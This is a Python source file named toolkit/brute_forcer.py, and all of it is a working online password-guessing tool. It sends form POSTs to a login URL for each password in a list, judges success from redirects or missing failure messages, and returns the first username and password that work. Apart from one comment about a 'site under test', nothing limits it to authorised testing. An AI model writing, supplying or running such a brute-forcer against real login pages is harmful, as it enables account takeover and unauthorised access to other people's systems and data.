# toolkit/brute_forcer.py
import requests
from typing import List, Optional, Tuple

DEFAULT_TIMEOUT = 10  # seconds

def make_login_request(url: str, username: str, password: str, timeout: int = DEFAULT_TIMEOUT) -> requests.Response:
    """
    Default form POST. Change to JSON or other fields if needed.
    """
    data = {"username": username, "password": password}
    headers = {"User-Agent": "Toolkit/1.0"}
    return requests.post(url, data=data, headers=headers, allow_redirects=True, timeout=timeout)

def is_login_success(resp: requests.Response) -> bool:
    """
    Heuristic: redirects or absence of common failure tokens -> success.
    Adjust for the site under test for reliability.
    """
    if 300 <= resp.status_code < 400:
        return True
    body = resp.text.lower()
    failure_tokens = [
        "invalid", "incorrect", "login failed", "authentication failed",
        "username or password", "invalid credentials"
    ]
    if any(tok in body for tok in failure_tokens):
        return False
    return True

def _ensure_str(s) -> str:
    if isinstance(s, (bytes, bytearray)):
        try:
            return s.decode("utf-8")
        except Exception:
            return s.decode(errors="ignore")
    return str(s)

def brute_force_login(url: str, username: str, password_list: List[str]) -> Optional[Tuple[str, str]]:
    """
    Try each password. Print inline 'Trying password: <pwd>' separated by spaces.
    Return (username, password) on success.
    """
    first = True
    for raw_pwd in password_list:
        pwd = _ensure_str(raw_pwd).strip()
        if not pwd:
            continue

        # print inline (space separated), no newline until finish or success
        # Avoid extra leading space on first item.
        prefix = "" if first else " "
        print(f"{prefix}Trying password: {pwd}", end="", flush=True)
        first = False

        try:
            resp = make_login_request(url, username, pwd)
        except requests.RequestException as e:
            # show error inline and continue
            print(f" [request error]", end="", flush=True)
            continue

        try:
            if is_login_success(resp):
                return (username, pwd)
        except Exception:
            continue

    return None
